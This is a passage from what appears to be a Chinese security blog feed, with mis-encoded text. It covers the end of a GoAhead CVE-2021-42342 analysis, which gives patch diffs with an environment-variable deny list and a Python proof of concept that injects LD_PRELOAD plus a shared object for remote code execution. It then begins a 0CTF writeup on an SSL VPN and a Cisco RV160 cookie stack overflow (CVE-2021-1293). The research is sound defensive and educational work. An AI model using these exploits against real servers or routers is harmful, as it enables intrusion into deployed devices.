alt="image-20220109195658790"></a></p><p><strong>æ€»ç»“</strong></p><ol><li>è®©ç¨‹åºæ²¡æœ‰è¯»å–åˆ° boundary , ç¨‹åºä¼šè§‰å¾—æ•°æ®æ²¡æœ‰å¤„ç†å®Œï¼Œ å› æ­¤ä¸ä¼š close æ–‡ä»¶æè¿°ç¬¦</li><li>è®©ç¨‹åºè®¤ä¸ºå‰©ä¸‹æœªè¯»åˆ°æ•°æ®ï¼Œ ä¸å¯èƒ½è¯»åˆ° boundary äº†ï¼Œ å› æ­¤ä¼šå† http.c:1293 è¡Œå¤„è®¾ç½® wp-&gt;eof flag </li><li>ä¿æŒé“¾æ¥çš„ä¸ä¸­æ–­ï¼Œ ç¨‹åºä¼šæ¥ç€å°è¯•è¯»æ•°æ®</li></ol><p>æ ¹æ®ä»¥ä¸Šçš„åˆ†æä»¥åŠä¹‹åçš„å®è·µï¼Œ æˆ‘ä»¬å‘ç°é™¤äº† phith0n  å¸ˆå‚…çš„è¿™ç§æ–¹æ³•ï¼Œå…¶å®è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼Œä¸”ä¸éœ€è¦ç«äº‰</p><ol><li>ä¸¤æ¬¡å‘é€æ•°æ®ï¼Œç¬¬ä¸€æ¬¡å‘é€éœ€è¦ payload.so å‘é€ä¸”å†™å…¥ä¸´æ—¶æ–‡ä»¶ï¼Œä¸”é€šè¿‡åˆ é™¤ boundary è®©ç¨‹åºhandleä½ï¼Œç¬¬äºŒæ¬¡å‘é€åŠ«æŒç¯å¢ƒå˜é‡</li><li>ä¸€æ¬¡å‘é€ï¼Œ åªéœ€åˆ é™¤ boundary æ ‡å¿—ï¼Œ ç„¶å sleep åï¼Œ å‘é€ä¸€æ¬¡æ•°æ®å³å¯</li></ol><h2 id="è¡¥ä¸åˆ†æ"><a href="#è¡¥ä¸åˆ†æ" class="headerlink" title="è¡¥ä¸åˆ†æ"></a>è¡¥ä¸åˆ†æ</h2><p><a href="https://github.com/embedthis/goahead/commit/6906212c8db07265850e3870dbc97b541712e2c7">FIX: flag upload form vars as untrusted so they will be prefixed. Â· embedthis/goahead@6906212 (github.com)</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@@ -320,6 +320,7 @@ static bool processContentData(Webs *wp)</span><br><span class="line">&#123;</span><br><span class="line">    WebsUpload  *file;</span><br><span class="line">    WebsBuf     *content;</span><br><span class="line"><span class="addition">+    WebsKey     *sp;</span></span><br><span class="line">    ssize       size, nbytes, len;</span><br><span class="line">    char        *data, *bp;</span><br><span class="line"></span><br><span class="line">@@ -380,7 +381,9 @@ static bool processContentData(Webs *wp)</span><br><span class="line">            trace(5, &quot;uploadFilter: form[%s] = %s&quot;, wp-&gt;uploadVar, data);</span><br><span class="line">            websDecodeUrl(wp-&gt;uploadVar, wp-&gt;uploadVar, -1);</span><br><span class="line">            websDecodeUrl(data, data, -1);</span><br><span class="line"><span class="deletion">-           websSetVar(wp, wp-&gt;uploadVar, data);</span></span><br><span class="line"><span class="addition">+            sp = websSetVar(wp, wp-&gt;uploadVar, data);</span></span><br><span class="line"><span class="addition">+            //  Flag as untrusted so CGI will prefix</span></span><br><span class="line"><span class="addition">+            sp-&gt;arg = 1;</span></span><br><span class="line">        &#125;</span><br><span class="line">        websConsumeInput(wp, nbytes);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/embedthis/goahead/commit/5bc764136fc7adbeea419d8cd360ed407c555f07">FIX: trim CGI env vars for black list Â· embedthis/goahead@5bc7641 (github.com)</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@@ -173,10 +173,10 @@ PUBLIC bool cgiHandler(Webs *wp)</span><br><span class="line">    if (wp-&gt;vars) &#123;</span><br><span class="line">        for (n = 0, s = hashFirst(wp-&gt;vars); s != NULL; s = hashNext(wp-&gt;vars, s)) &#123;</span><br><span class="line">            if (s-&gt;content.valid &amp;&amp; s-&gt;content.type == string) &#123;</span><br><span class="line"><span class="deletion">-                vp = strim(s-&gt;name.value.string, 0, WEBS_TRIM_START);</span></span><br><span class="line"><span class="addition">+                vp = strim(s-&gt;name.value.string, &quot; \t\r\n&quot;, WEBS_TRIM_BOTH);</span></span><br><span class="line">                if (smatch(vp, &quot;REMOTE_HOST&quot;) || smatch(vp, &quot;HTTP_AUTHORIZATION&quot;) ||</span><br><span class="line">                    smatch(vp, &quot;IFS&quot;) || smatch(vp, &quot;CDPATH&quot;) ||</span><br><span class="line"><span class="deletion">-                    smatch(vp, &quot;PATH&quot;) || sstarts(vp, &quot;LD_&quot;)) &#123;</span></span><br><span class="line"><span class="addition">+                    smatch(vp, &quot;PATH&quot;) || sstarts(vp, &quot;PYTHONPATH&quot;) || sstarts(vp, &quot;LD_&quot;)) &#123;</span></span><br><span class="line">                    continue;</span><br><span class="line">                &#125;</span><br><span class="line">                if (s-&gt;arg != 0 &amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != &#x27;\0&#x27;) &#123;</span><br></pre></td></tr></table></figure><p>ä¿®æ­£äº†  strim å‡½æ•°çš„æ­£ç¡®ä½¿ç”¨ï¼Œä»¥åŠå¯¹æ–‡ä»¶ä¸Šä¼ å¤„ç†åŒæ ·åŠ å…¥äº†<code>sp-&gt;arg = 1</code>çš„å¤„ç†</p><h2 id="æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦-çš„é—®é¢˜è¡¥å……"><a href="#æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦-çš„é—®é¢˜è¡¥å……" class="headerlink" title="æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦ çš„é—®é¢˜è¡¥å……"></a>æ‰¾ä¸åˆ°æ–‡ä»¶æè¿°ç¬¦ çš„é—®é¢˜è¡¥å……</h2><p>update ï¼š 2022/01/17 </p><p>@nepire ä»Šå¤©å’Œæˆ‘æäº†ä¸€ä¸ªè§£å†³è¿™ä¸ªé—®é¢˜çš„å¦å¤–ä¸€ä¸ªæ–¹æ³• ï¼Œ æˆ‘ä»¬ç®€å•å›é¡¾ä¸‹ä»£ç </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171711335.png" title="image-20220117171150196" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171711335.png" alt="image-20220117171150196"></a></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ä¸´æ—¶æ–‡ä»¶æ˜¯åœ¨ src/upload.c:342 è¡Œå†™å…¥çš„ï¼Œä½†æ˜¯é™¤äº†æ­¤å¤„ä»¥ä¸ºæˆ‘ä»¬æ²¡æœ‰å…¶ä»–åœ°æ–¹å†™ä¸´æ—¶æ–‡ä»¶äº†å—ï¼Ÿæœç´¢ä¸€ä¸‹ <code>write\(.*fd</code> å†™å…¥æ–‡ä»¶çš„ä»£ç </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171720190.png" title="image-20220117172041121" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171720190.png" alt="image-20220117172041121"></a></p><p>æˆ‘ä»¬æ‰¾åˆ°å¦å¤–ä¸€å¤„æ–‡ä»¶æè¿°ç¬¦ï¼Œ <code>wp-&gt;cgifd</code> , å…¶å†™å…¥çš„å†…å®¹ä¸º <code>wp-&gt;input.servp</code>,   é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ä¿è¯ <code>wp-&gt;input.servp</code> æ•°æ®å³ä¸º ELF çš„æ•°æ®å‘¢ï¼Ÿ</p><p>æ ¹æ®ç®€å•é˜…è¯»ä»£ç , å³åœ¨ upload.c  ä»£ç ä¸­</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171801106.png" title="image-20220117180115037" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171801106.png" alt="image-20220117180115037"></a></p><p>åœ¨ upload å¤„ç†æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œ æ•°æ®æŒ‡é’ˆç”± <code>bufCompact</code> å‡½æ•°å¤„ç†ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171803209.png" title="image-20220117180328157" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171803209.png" alt="image-20220117180328157"></a></p><p>è¯¥å‡½æ•°å°†æ­¤æ¬¡è¯»å–çš„ æ•°æ®ç”± <code>bp-&gt;servp</code> æ‹·è´åˆ° <code>bp-&gt;buf</code>ä¸­ï¼Œ ç„¶ååœ¨ç§»åŠ¨ä¿®æ”¹ <code>bp-&gt;servp</code> ï¼Œ å½“è¯»å–åˆ° <code>Boundary</code>ç»“æŸçš„æ—¶å€™ï¼Œ<code>bp-&gt;servp</code> åˆšå¥½æŒ‡å‘äº† <code>--------------------------6671c05704e869e7--</code> çš„ç»“å°¾å¤„ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€åœ¨æ­¤å¤„åé¢è¡¥å…… ELF æ•°æ®å³å¯</p><p>å› æ­¤å¤§è‡´ PoC å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">headers = <span class="string">&quot;&quot;&quot;POST /cgi-bin/test.cgi HTTP/1.1\r</span></span><br><span class="line"><span class="string">Host: localhost:8080\r</span></span><br><span class="line"><span class="string">Accept: */*\r</span></span><br><span class="line"><span class="string">Connection: close\r</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=------------------------f74e4c2f448c9827\r</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">body = <span class="string">b&quot;&quot;&quot;--------------------------f74e4c2f448c9827</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;\r</span></span><br><span class="line"><span class="string">\r</span></span><br><span class="line"><span class="string">/dev/stdin\r</span></span><br><span class="line"><span class="string">--------------------------f74e4c2f448c9827--\r</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#/dev/stdin</span></span><br><span class="line"><span class="comment">#/proc/self/fd/0</span></span><br><span class="line"></span><br><span class="line">n = remote(ip,port)</span><br><span class="line">post = body + parse_so(<span class="string">&#x27;./poc.so&#x27;</span>)</span><br><span class="line">n.send(headers.format(len(post)).encode(<span class="string">&#x27;latin&#x27;</span>) + post)</span><br></pre></td></tr></table></figure><p>å¦å¤–æ­¤æ—¶åŠ«æŒçš„ fd å¯ä»¥æŒ‡å‘ 0 æˆ–è€… 6ï¼Œ å› ä¸ºåœ¨ launchCgi å‡½æ•°ä¸­ä¼šé‡æ–° dup2 ç›¸å…³æ–‡ä»¶æè¿°ç¬¦ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171840954.png" title="image-20220117184055856" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201171840954.png" alt="image-20220117184055856"></a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/6407">CVE-2017-17562 GoAheadè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p><a href="https://tttang.com/archive/1399/">GoAheadç¯å¢ƒå˜é‡æ³¨å…¥å¤ç°è¸©å‘è®° - è·³è·³ç³– (tttang.com)</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2021-42342 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021 TCTF iOA and RV Writeup</title>
      <link href="2021-TCTF-RV-Writeup.html"/>
      <url>2021-TCTF-RV-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å‘¨æœ«å’Œr3kapigçš„å°ä¼™ä¼´ä¸€èµ·æ‰“äº†ï¼Œ 0CTF/TCTF 2021 Qualsï¼Œ ç„¶åä¸¤å¤©çš„æ—¶é—´éƒ½è€—åœ¨äº† iOA å’Œ RV è¿™ä¸¤ä¸ªé¢˜èº«ä¸Šäº†ã€‚<br><a class="gallery-item"><img src=""></a>(<a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706110534.png">https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706110534.png</a>)</p><h2 id="iOA"><a href="#iOA" class="headerlink" title="iOA"></a>iOA</h2><p>è¿™ä¸ªé¢˜ç›®ï¼Œåœ¨ pizza å’Œ åœ£åš å› ä¸ºåœ¨æ‹–ç€æˆ‘çš„æƒ…å†µä¸‹åšäº†å¥½ä¹…æ‰åšå‡ºæ¥ï¼Œ æœ€ç»ˆæ‹¿äº†ä¸ªäºŒè¡€ã€‚</p><p>é¢˜ç›®å®ç°äº†ä¸€ä¸ª sslvpn åè®®æ ˆï¼Œæœ‰å‡ ä¸ªæ¼æ´ç‚¹</p><p>ï¼ˆ1ï¼‰urlencode å¯ä»¥ç»•è¿‡  ../ çš„æ£€æŸ¥ï¼Œå¯¼è‡´è·¨ç›®å½•æ–‡ä»¶è¯»å–ï¼Œ å¯ä»¥è¯»å– user.txt çš„è´¦å·å¯†ç </p><p>   (2)  vip çš„ bitmap æ“ä½œæœ‰è´Ÿæ•°è¶Šç•Œæ“ä½œï¼Œ å¯ä»¥è®¿é—®bssä¸Šçš„å†…å®¹, è¯»master_keyï¼Œæ”¹dhcp_poolï¼Œç”¨req_vipçš„æ•´æ•°æˆªæ–­leak canaryï¼Œåœ¨req_vipé‡Œæ ˆæº¢å‡ºã€‚</p><p>ç›¸å…³æ–‡ä»¶å¯ä»¥è¿™é‡Œè·å–ï¼›</p><ol><li><p>sslvpn idb</p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/sslvpnd.i64">http://bestwing.me/attachments/2021-TCTF-quals/iOA/sslvpnd.i64</a></p></li><li><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/iOA/leak.py">leak.py</a></p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/leak.py">http://bestwing.me/attachments/2021-TCTF-quals/iOA/leak.py</a></p></li><li><p><a href="https://github.com/WinMin/WinMin.github.io/blob/master/attachments/2021-TCTF-quals/iOA/exploit.py">exploit.py</a></p><p><a href="http://bestwing.me/attachments/2021-TCTF-quals/iOA/exploit.py">http://bestwing.me/attachments/2021-TCTF-quals/iOA/exploit.py</a></p></li></ol><h2 id="RV"><a href="#RV" class="headerlink" title="RV"></a>RV</h2><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Cisco RV160 Router behind iOA!<br>remote version is <code>1.0.01.01</code>.<br><a href="http://10.1.1.1/">http://10.1.1.1</a></p></blockquote><p>è¿™ä¸ªé¢˜ç›®å‘¢ï¼Œ æ˜¯ä¸€ä¸ª Cisco RV160çš„ 1dayé¢˜ï¼Œè¿™é¢˜ä¹Ÿæ˜¯æ¯”è¾ƒå¯æƒœçš„ã€‚å…¶å®èƒ½åšå‡ºæ¥çš„ï¼Œå› ä¸ºä¹‹å‰æˆ‘åˆšå¥½ä¹Ÿç»™æ€ç§‘æŠ¥è¿‡ RV160çš„æ´ï¼Œæ˜¯ä¸€ä¸ªhttpdä¸Šçš„æ ˆæº¢å‡ºï¼Œåˆšå¥½ä¹Ÿæ˜¯è¿™ä¸ªç‰ˆæœ¬ã€‚ä½†æ˜¯æ‰“æ¯”èµ›çš„æ—¶å€™ä¸ºäº†çœäº‹ï¼Œ æƒ³ç”¨ cgi çš„å‘½ä»¤æ³¨å…¥æ‰“ï¼Œ æ²¡æ‰“æˆåŠŸï¼Œè€Œä¸”ä¸ç®¡è®¿é—®ä»€ä¹ˆå½“æ—¶éƒ½æ˜¯è¿”å› 403 é”™è¯¯ï¼Œä¸€åº¦è®©æˆ‘æ€€ç–‘äººç”Ÿ</p><p>èµ›åæ‰çŸ¥é“ï¼Œ ç”±äºä¸»åŠæ–¹æ˜¯ docker + qemu å¯åŠ¨çš„ï¼Œ çŒœæµ‹å¯¼è‡´æœ‰äº›ç¯å¢ƒå˜é‡æœ‰é—®é¢˜ï¼Œå› æ­¤åœ¨403 check çš„æ—¶å€™è¿‡ä¸å»ï¼Œå› æ­¤æ ¹æœ¬åˆ°ä¸äº†æ‰§è¡Œ cgi çš„ä½ç½®ã€‚</p><p>ç„¶ååœ¨è¿™é‡Œæˆ‘æ‰“ç®—å…¬å¼€è¿™ä¸ªçš„æ¼æ´çš„ç»†èŠ‚ï¼Œä»¥åŠåœ¨è¿™ä¸ªé¢˜ç›®ä¸Šçš„åˆ©ç”¨ï¼Œ è¿™ä¸ªæ¼æ´åº”è¯¥æ˜¯å»å¹´æŠ¥å‘Šçš„ï¼Œç¼–å·ä¸º  CVE-2021-1293</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706115827.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706115827.png"></a></p><h3 id="æ¼æ´ç»†èŠ‚"><a href="#æ¼æ´ç»†èŠ‚" class="headerlink" title="æ¼æ´ç»†èŠ‚"></a>æ¼æ´ç»†èŠ‚</h3><p>åœ¨å¤„ç† cookie çš„æ—¶å€™ï¼Œä¼šå­˜åœ¨æº¢å‡ºæ ˆæº¢å‡ºã€‚</p><p>ï¼ˆ1ï¼‰ é¦–å…ˆåœ¨ httpd handle ä¸­ï¼Œ cookie çš„æŒ‡é’ˆä¼šèµ‹å€¼åˆ°ä¸€ä¸ªå…¨å±€å˜é‡é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( !strncasecmp(s1, <span class="string">&quot;Cookie:&quot;</span>, <span class="number">7u</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  nptr = s1 + <span class="number">7</span>;</span><br><span class="line">  v11 = <span class="built_in">strspn</span>(s1 + <span class="number">7</span>, <span class="string">&quot; \t&quot;</span>);</span><br><span class="line">  nptr += v11;</span><br><span class="line">  Cookie = (<span class="keyword">int</span>)nptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰ ç„¶ååœ¨ check_need_login å‡½æ•°ä¸­, ä¼šåˆ¤æ–­å“ªäº› uri éœ€è¦ç™»å½•    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v33 = check_need_login(v25);</span><br><span class="line"><span class="keyword">if</span> ( v33 )</span><br><span class="line">  v38 = check_Is_not_login_page((<span class="keyword">const</span> <span class="keyword">char</span> *)Cookie);</span><br><span class="line">v26 = <span class="built_in">printf</span>(<span class="string">&quot;=====is_login=%d, is_not_login_page=%d&quot;</span>, v38, v33);</span><br><span class="line"><span class="keyword">if</span> ( v39 || !v38 &amp;&amp; v33 )</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_need_login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [sp+4h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !uri_string || !*(_BYTE *)uri_string )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;help&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;images/collapsed.png&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;cportal&quot;</span>)</span><br><span class="line">    || <span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;index.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;login.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;alert0.htm&quot;</span>)</span><br><span class="line">    &amp;&amp; !<span class="built_in">strstr</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)uri_string, <span class="string">&quot;confirm1.htm&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;check_is_not_login_page====res=%d&quot;</span>, v2);</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼Œ æˆ‘è®¿é—®  this_is_hack.htm ï¼Œè¿™ä¸ªurlï¼Œ è¿™ä¸ªå°±ç¬¦å·éœ€è¦ç™»å½•çš„é€»è¾‘</p><p>(3) ç„¶å è¿›å…¥åˆ° check_Is_not_login_page å‡½æ•°ä¸­</p><p>åœ¨å¤„ç† sessionID çš„è¿‡ç¨‹ä¸­å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_16138</span><span class="params">(<span class="keyword">char</span> *cookie, <span class="keyword">const</span> <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;get_session_id   session=%s&quot;</span>, cookie);</span><br><span class="line">  s1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(cookie, <span class="string">&quot;sessionID&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( s1 = strtok(cookie, <span class="string">&quot; &quot;</span>); s1; s1 = strtok(<span class="number">0</span>, <span class="string">&quot; &quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;sessionID&quot;</span>, <span class="number">9u</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_15CE4(s1, byte_1FCD4, <span class="string">&quot;=&quot;</span>, v6, v5);</span><br><span class="line">.......</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>åˆ¤æ–­ cookie æ˜¯å¦æœ‰ <code>sessionID</code> å­—ç¬¦ä¸²ï¼Œ å¦‚æœå­˜åœ¨åˆ™è¿›åˆ°  <code>sub_15CE4</code> å‡½æ•°, ç„¶åå°±èƒ½çœ‹åˆ°æ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  src = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">if</span> ( *sessionID &amp;&amp; <span class="built_in">strstr</span>(sessionID, a2) &amp;&amp; (src = strtok(sessionID, a2)) != <span class="number">0</span> )<span class="comment">// sub_15CE4(v14, &quot;;&quot;, &quot;=&quot;, v10, v4);</span></span><br><span class="line">    <span class="built_in">strcpy</span>(s, src);                             <span class="comment">// BOF</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">strcpy</span>(s, sessionID);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706141734.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706141734.png"></a></p><p>æº¢å‡ºåï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œ çœ‹èµ·æ¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„å¯„å­˜å™¨åªæœ‰ R11 ï¼Œ ä½†å®é™…ä¸Šï¼Œè¿”å›å R0 å¯„å­˜å™¨åˆ™æ˜¯æˆ‘ä»¬ä¼ å…¥ cookie å‚æ•°çš„æŒ‡é’ˆã€‚</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706142456.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210706142456.png" style="zoom: 50%;" /></a><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨ payload çš„å‰é¢ç›´æ¥æ”¾ç½® system æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åæ§åˆ¶ PCè·³è½¬åˆ° system å‡½æ•°ä¸Šï¼ˆ httpd ç¨‹åºæœ¬èº«æœ‰è°ƒç”¨ httpd çš„åœ°æ–¹ï¼Œä¸éœ€è¦leakï¼Œ å¦å¤–æä¸€å¥ï¼Œå› ä¸ºæœ‰ 00 æˆªæ–­ï¼Œå› æ­¤æˆ‘åªèƒ½æ§åˆ¶ä¸€æ¬¡ PC çš„åœ°å€ï¼Œä½†æ˜¯å¯¹è¿™ä¸ªç¯å¢ƒæ¥è¯´è¶³å¤Ÿäº†</p><p>å¦å¤–è¿™ä¸ªé¢˜ç›®åœ¨ 0ctf ä¸­æ˜¯ä½äº iOAçš„åé¢çš„ï¼Œ æˆ‘ä»¬éœ€è¦é€šè¿‡ iOAçš„vpnåŠŸèƒ½ï¼Œè®¿é—®å†…ç½‘ä¸­è¿™ä¸ªè·¯ç”±å™¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ‰‹æ’¸ä¸€ä¸ª route è½¬å‘ï¼Œ ç„¶åæˆ‘ä»¬çš„åœ£åšå°±ç›´æ¥ç”¨ scapy 